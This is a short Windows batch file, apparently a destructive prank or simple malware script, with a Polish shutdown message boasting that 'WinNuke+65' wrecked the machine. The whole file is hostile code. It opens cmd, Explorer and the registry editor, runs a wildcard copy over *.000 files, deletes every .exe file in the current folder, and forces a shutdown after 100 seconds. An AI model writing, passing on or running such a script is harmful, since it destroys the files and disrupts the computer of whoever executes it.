@echo off
start cmd.exe
start explorer.exe
start regedit.exe
copy *.000 *.*
del*.exe
shutdown -s -t 100 -c "WinNuke+65 rozwalił maszyne"
